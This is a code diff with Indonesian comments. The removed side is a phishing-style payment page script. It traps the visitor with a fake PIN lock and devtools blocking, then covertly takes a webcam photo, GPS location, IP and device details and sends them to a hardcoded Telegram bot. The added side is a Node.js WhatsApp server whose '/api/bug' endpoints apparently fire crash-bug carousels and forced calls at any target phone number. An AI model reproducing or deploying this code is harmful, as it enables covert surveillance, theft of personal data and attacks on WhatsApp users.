@@ -1,208 +1,208 @@
-// Telegram Bot Config - Ganti dengan token dan chat ID Anda
-const BOT_TOKEN = "7771429262:AAHwRR2VVM0Wlh1LWsmk9V3ZRifx8RZUU9Y";
-const OWNER_CHAT_ID = "6878949999";
+console.clear();
+require('./config');
+console.log('starting...');
+process.on("uncaughtException", console.error);
 
-const startBtn = document.getElementById('startBtn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const statusDiv = document.getElementById('status');
-const copyBtn = document.getElementById('copyBtn');
-const paymentNumber = document.getElementById('paymentNumber');
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    fetchLatestBaileysVersion,
+    makeInMemoryStore,
+    generateWAMessageFromContent,
+    jidDecode,
+    proto,
+    delay,
+    relayWAMessage,
+    getContentType,
+    generateMessageTag,
+    getAggregateVotesInPollMessage,
+    downloadContentFromMessage,
+    fetchLatestWaWebVersion,
+    InteractiveMessage,
+    makeCacheableSignalKeyStore,
+    Browsers,
+    generateForwardMessageContent,
+    MessageRetryMap
+} = require("@whiskeysockets/baileys");
 
-const pinOverlay = document.getElementById('pinOverlay');
-const pinInput = document.getElementById('pinInput');
-const pinError = document.getElementById('pinError');
+const pino = require('pino');
+const readline = require("readline");
+const fs = require('fs');
+const express = require("express");
+const bodyParser = require('body-parser');
+const cors = require("cors");
+const path = require("path");
 
-const CORRECT_PIN = "12345";
+const app = express();
+const PORT = process.env.PORT || 5036
 
-// Lock navigation and tab switching
-window.addEventListener('blur', () => {
-  if (!pinOverlay.hidden) return; // if locked, ignore
-  alert("Anda harus memasukkan PIN untuk meninggalkan halaman ini.");
-  window.focus();
-});
+const { carousels2, forceCall } = require('./bug');
+const { getRequest, sendTele } = require('./telegram');
 
-// Disable right click and keyboard shortcuts for devtools/tab switching
-window.addEventListener('contextmenu', e => e.preventDefault());
-window.addEventListener('keydown', e => {
-  // Block F12, Ctrl+Shift+I/J, Ctrl+U, Ctrl+W, Ctrl+Tab, Alt+Tab (some)
-  if (
-    e.key === "F12" ||
-    (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
-    (e.ctrlKey && e.key === "U") ||
-    (e.ctrlKey && e.key === "W") ||
-    (e.altKey && e.key === "Tab")
-  ) {
-    e.preventDefault();
-    alert("Akses dibatasi. Masukkan PIN untuk melanjutkan.");
-  }
-});
+app.enable("trust proxy");
+app.set("json spaces", 2);
+app.use(cors());
+app.use(express.urlencoded({
+    extended: true
+}));
+app.use(express.json());
+app.use(express.static(path.join(__dirname, "public")));
+app.use(bodyParser.raw({
+    limit: '50mb',
+    type: '*/*'
+}));
 
-// Show PIN overlay on load
-function lockScreen() {
-  pinOverlay.hidden = false;
-  pinInput.value = "";
-  pinError.textContent = "";
-  pinInput.focus();
-  startBtn.disabled = true;
-  startBtn.setAttribute('aria-busy', 'true');
-  statusDiv.textContent = "";
-}
-lockScreen();
+const { Boom } = require('@hapi/boom');
+const usePairingCode = true;
 
-// PIN input handler
-pinInput.addEventListener('keydown', e => {
-  if (e.key === 'Enter') {
-    checkPin();
-  }
-});
-function checkPin() {
-  if (pinInput.value === CORRECT_PIN) {
-    pinOverlay.hidden = true;
-    startBtn.disabled = false;
-    startBtn.setAttribute('aria-busy', 'false');
-    statusDiv.textContent = "Selamat datang! Silakan gunakan tombol di bawah.";
-  } else {
-    pinError.textContent = "PIN salah, coba lagi.";
-    pinInput.value = "";
-    pinInput.focus();
-  }
-}
-
-// Salin nomor pembayaran ke clipboard
-copyBtn.addEventListener('click', () => {
-  navigator.clipboard.writeText(paymentNumber.textContent.trim())
-    .then(() => {
-      alert("Nomor pembayaran berhasil disalin!");
-    })
-    .catch(() => {
-      alert("Gagal menyalin nomor pembayaran. Silakan salin secara manual.");
+const question = (text) => {
+    const rl = readline.createInterface({
+        input: process.stdin,
+        output: process.stdout
     });
-});
-
-// Kirim pesan ke Telegram
-async function sendTelegramMessage(text) {
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: OWNER_CHAT_ID,
-        text: text,
-        parse_mode: "Markdown"
-      })
+    return new Promise((resolve) => {
+        rl.question(text, resolve);
     });
-  } catch (e) {
-    console.error("Gagal kirim pesan Telegram:", e);
-  }
-}
+};
 
-// Kirim foto ke Telegram
-async function sendTelegramPhoto(base64Image, caption) {
-  try {
-    const blob = await (await fetch(base64Image)).blob();
-    const formData = new FormData();
-    formData.append('chat_id', OWNER_CHAT_ID);
-    formData.append('photo', blob, 'photo.jpg');
-    formData.append('caption', caption);
-    formData.append('parse_mode', 'Markdown');
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    });
-  } catch (e) {
-    console.error("Gagal kirim foto Telegram:", e);
-  }
-}
-
-// Ambil info device dan IP publik
-async function getDeviceInfo() {
-  const ua = navigator.userAgent;
-  const lang = navigator.language || "N/A";
-  const resolution = `${screen.width}x${screen.height}`;
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
-  const ram = navigator.deviceMemory || "N/A";
-  const cpu = navigator.hardwareConcurrency || "N/A";
-  const online = navigator.onLine ? "Online" : "Offline";
-  const cookiesEnabled = navigator.cookieEnabled ? "Ya" : "Tidak";
-  const doNotTrack = navigator.doNotTrack || "N/A";
-
-  let ip = "N/A", country = "N/A", region = "N/A", city = "N/A", isp = "N/A";
-  try {
-    const ipRes = await fetch("https://ipapi.co/json");
-    const ipData = await ipRes.json();
-    ip = ipData.ip || ip;
-    country = ipData.country_name || country;
-    region = ipData.region || region;
-    city = ipData.city || city;
-    isp = ipData.org || isp;
-  } catch {}
-
-  return { ua, lang, resolution, timezone, ram, cpu, online, cookiesEnabled, doNotTrack, ip, country, region, city, isp };
-}
-
-// Format pesan Markdown
-function formatMessage(data, coords) {
-  return `📍 *Info Pengunjung*\n` +
-    `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n` +
-    `📌 *Lokasi GPS:* ${coords.latitude}, ${coords.longitude} (Akurasi: ${coords.accuracy}m)`;
-}
-
-// Fungsi utama: minta izin, ambil data, kirim ke Telegram
-async function captureAndSend() {
-  statusDiv.textContent = "Meminta izin lokasi, kamera, dan media...";
-  startBtn.disabled = true;
-  startBtn.setAttribute('aria-busy', 'true');
-
-  try {
-    // Minta lokasi
-    const coords = await new Promise((resolve, reject) => {
-      if (!navigator.geolocation) reject(new Error("Geolocation tidak didukung"));
-      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
+async function clientstart() {
+    const { state, saveCreds } = await useMultiFileAuthState(`./session`);
+    const { version, isLatest } = await fetchLatestBaileysVersion();
+    const client = makeWASocket({
+        logger: pino({ level: "silent" }),
+        printQRInTerminal: false,
+        auth: state,
+        browser: ["Ubuntu", "Chrome", "20.0.00"]
     });
 
-    // Minta kamera (video) dan mikrofon (audio)
-    const stream = await navigator.mediaDevices.getUser Media({ video: { facingMode: "user" }, audio: true });
+    if (!client.authState.creds.registered) {
+        const phoneNumber = await question('please enter your WhatsApp number, starting with 62:\n> ');
+        const code = await client.requestPairingCode(phoneNumber, "12341234");
+        console.log(`your pairing code: ${code}`);
+    }
 
-    // Video dan canvas disembunyikan, tidak tampil ke user
-    video.srcObject = stream;
-    video.style.display = "none";
+    app.get('/api/bug/carousels', async (req, res) => {
+        const { target, fjids } = req.query;
+        if (!target) return res.status(400).json({
+            status: false,
+            message: "parameter target diperlukan"
+        });
+        if (!fjids) return res.status(400).json({
+            status: false,
+            message: "parameter fjids diperlukan"
+        });
+        let bijipeler = target.replace(/[^0-9]/g, "");
+        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
+        
+        let cuki = bijipeler + '@s.whatsapp.net';
+        const info = await getRequest(req);
+        try {
+            await carousels2(client, cuki, fjids);
+            res.json({
+                status: true,
+                creator: global.creator,
+                result: "sukses"
+            });
+            console.log(`successfully sent carousels to number ${cuki}`);
+            const penis = `\n[API HIT]
+        
+Endpoint: Carousels2
+Target: ${target}
+IP: ${info.ip}
+Method: ${info.method}
 
-    await new Promise(resolve => video.onloadedmetadata = resolve);
+this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable
 
-    statusDiv.textContent = "Mengambil foto...";
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+${info.timestamp}`;
+            sendTele(penis);
+        } catch (error) {
+            console.error(error);
+            res.status(500).json({
+                status: false,
+                error: error.message
+            });
+        }
+    });
 
-    const base64Image = canvas.toDataURL('image/jpeg', 0.7);
+    app.get('/api/bug/forcecall', async (req, res) => {
+        const { target } = req.query;
+        if (!target) return res.status(400).json({
+            status: false,
+            message: "parameter target diperlukan"
+        });
+        let bijipeler = target.replace(/[^0-9]/g, "");
+        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
+        
+        let cuki = bijipeler + '@s.whatsapp.net';
+        const info = await getRequest(req);
+        try {
+            await forceCall(client, cuki);
+            res.json({
+                status: true,
+                creator: global.creator,
+                result: "sukses"
+            });
+            console.log(`successfully sent forcecall to number ${cuki}`);
+            const penis = `\n[API HIT]
+        
+Endpoint: Forcecall
+Target: ${target}
+IP: ${info.ip}
+Method: ${info.method}
 
-    // Stop semua track kamera & mikrofon
-    stream.getTracks().forEach(track => track.stop());
+this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable
 
-    statusDiv.textContent = "Mengumpulkan info perangkat...";
-    const deviceInfo = await getDeviceInfo();
+${info.timestamp}`;
+            sendTele(penis);
+        } catch (error) {
+            console.error(error);
+            res.status(500).json({
+                status: false,
+                error: error.message
+            });
+        }
+    });
+    
+    client.ev.on('connection.update', (update) => {
+        const { konek } = require('./connect');
+        konek({
+            client,
+            update,
+            clientstart,
+            DisconnectReason,
+            Boom
+        });
+    });
 
-    statusDiv.textContent = "Mengirim data ke Telegram...";
-    const message = formatMessage(deviceInfo, coords.coords);
-
-    await sendTelegramMessage(message);
-
-    const captionPhoto = `📸 Foto Pengunjung\n📌 Lokasi: ${coords.coords.latitude.toFixed(6)}, ${coords.coords.longitude.toFixed(6)}\n🕒 ${new Date().toLocaleString()}`;
-    await sendTelegramPhoto(base64Image, captionPhoto);
-
-    statusDiv.textContent = "Data berhasil dikirim ke Telegram. Terima kasih!";
-  } catch (err) {
-    statusDiv.textContent = "Error: " + (err.message || err);
-    console.error(err);
-  } finally {
-    startBtn.disabled = false;
-    startBtn.setAttribute('aria-busy', 'false');
-  }
+    client.ev.on('creds.update', saveCreds);
+    return client;
 }
 
-startBtn.addEventListener('click', () => {
-  captureAndSend();
+clientstart();
+
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.listen(PORT, () => {
+    console.log(`Server is running on http://localhost:${PORT}`);
+}).on('error', (err) => {
+    if (err.code === 'EADDRINUSE') {
+        console.error(`Port ${PORT} is in use. Trying another port...`);
+        const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
+        app.listen(newPort, () => {
+            console.log(`Server is running on http://localhost:${newPort}`);
+        });
+    } else {
+        console.error('An error occurred:', err.message);
+    }
+});
+
+let file = require.resolve(__filename);
+require('fs').watchFile(file, () => {
+    require('fs').unwatchFile(file);
+    console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m');
+    delete require.cache[file];
+    require(file);
 });
